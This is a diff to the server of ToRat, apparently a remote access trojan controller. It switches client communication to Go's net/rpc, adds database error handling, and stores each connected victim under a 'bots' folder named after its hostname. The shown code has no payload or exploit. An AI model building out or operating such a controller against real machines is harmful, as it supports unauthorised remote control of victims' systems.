@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"net/rpc"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -12,7 +13,6 @@ import (
 	"github.com/fatih/color"
 	"github.com/jinzhu/gorm"
 	_ "github.com/jinzhu/gorm/dialects/sqlite" //sqlite
-	"github.com/lu4p/ToRat/torat_server/crypto"
 )
 
 const port = ":1338"
@@ -23,11 +23,16 @@ var activeClients []activeClient
 
 // Start runs the server
 func Start() {
-	db, _ = gorm.Open("sqlite3", "ToRat.db")
+	var err error
+	db, err = gorm.Open("sqlite3", "ToRat.db")
+	if err != nil {
+		log.Fatalln("Could not open db", err)
+	}
+
 	defer db.Close()
 
 	// Migrate the schema
-	db.AutoMigrate(&client{})
+	db.AutoMigrate(&Client{})
 
 	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
 	if err != nil {
@@ -54,22 +59,17 @@ func Start() {
 
 func accept(conn net.Conn) {
 	var c activeClient
-	c.Conn = conn
-	encHostname, err := c.runCommandByte("hostname")
+
+	c.RPC = rpc.NewClient(conn)
+	err := c.GetHostname()
 	if err != nil {
 		log.Println("Invalid Hostname", err)
 		return
 	}
-	log.Println("Len Hostname", len(encHostname))
-	hostname, err := crypto.DecAsym(encHostname)
-	if err != nil {
-		log.Println("Invalid Hostname", err)
-		return
-	}
-	c.Hostname = string(hostname)
-	c.Client = &client{Hostname: string(hostname), Path: filepath.Join("bots", c.Hostname)}
-	db.FirstOrCreate(&c.Client, client{Hostname: string(hostname)})
-	log.Println("success")
+	c.Client = Client{Hostname: c.Hostname, Path: filepath.Join("bots", c.Hostname)}
+	log.Println(&c.Client, Client{Hostname: c.Hostname})
+	log.Println(db)
+	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})
 
 	if _, err = os.Stat(c.Client.Path); err != nil {
 		os.MkdirAll(c.Client.Path, os.ModePerm)
